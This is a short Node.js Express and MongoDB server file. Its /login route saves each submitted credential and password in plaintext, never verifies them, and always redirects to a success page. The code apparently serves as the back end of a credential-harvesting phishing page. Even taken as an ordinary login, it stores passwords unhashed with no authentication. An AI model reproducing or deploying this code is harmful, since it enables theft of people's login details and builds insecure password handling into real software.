const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');
const config = require('./config');

const app = express();
const PORT = config.PORT;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// MongoDB Connection
mongoose.connect(config.MONGODB_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => {
  console.log('Connected to MongoDB');
}).catch(err => {
  console.error('Error connecting to MongoDB', err);
});

// User Schema
const userSchema = new mongoose.Schema({
  credential: {
    type: String,
    required: true
  },
  password: {
    type: String,
    required: true
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
});

const User = mongoose.model('User', userSchema);

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/login', async (req, res) => {
  try {
    const { credential, password } = req.body;
    
    // Save user credentials to database
    const newUser = new User({
      credential,
      password
    });
    
    await newUser.save();
    
    // Redirect to a success page
    res.redirect('/success.html');
  } catch (error) {
    console.error('Error saving user:', error);
    res.redirect('/error.html');
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT} in ${config.NODE_ENV} mode`);
}); 